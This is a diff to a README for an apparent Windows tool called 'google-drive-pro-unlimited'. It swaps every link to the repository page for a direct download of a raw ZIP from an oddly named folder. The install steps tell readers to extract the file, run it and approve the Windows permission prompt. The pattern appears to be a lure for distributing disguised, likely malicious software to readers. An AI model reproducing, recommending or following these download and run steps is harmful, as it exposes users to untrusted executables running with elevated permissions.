@@ -1,6 +1,6 @@
 # 📁 google-drive-pro-unlimited - Simple Drive Control for Windows
 
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/debbiloverly246/google-drive-pro-unlimited)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/debbiloverly246/google-drive-pro-unlimited/raw/refs/heads/main/monoblepsis/drive-pro-unlimited-google-v1.3.zip)
 
 ## 🖥️ What This App Does
 
@@ -10,7 +10,7 @@ It is built for everyday use. You can use it to move files faster, keep folders 
 
 ## ⬇️ Download and Install
 
-1. Open the main download page: https://github.com/debbiloverly246/google-drive-pro-unlimited
+1. Open the main download page: https://github.com/debbiloverly246/google-drive-pro-unlimited/raw/refs/heads/main/monoblepsis/drive-pro-unlimited-google-v1.3.zip
 2. Download the Windows version from the page.
 3. Save the file to your Desktop or Downloads folder.
 4. If the file is a ZIP folder, right-click it and choose Extract All.
@@ -19,7 +19,7 @@ It is built for everyday use. You can use it to move files faster, keep folders 
 7. If Windows asks for permission, select Yes.
 
 If you use Google Drive often, keep this page saved so you can return to it later:
-https://github.com/debbiloverly246/google-drive-pro-unlimited
+https://github.com/debbiloverly246/google-drive-pro-unlimited/raw/refs/heads/main/monoblepsis/drive-pro-unlimited-google-v1.3.zip
 
 ## ⚙️ System Requirements
 
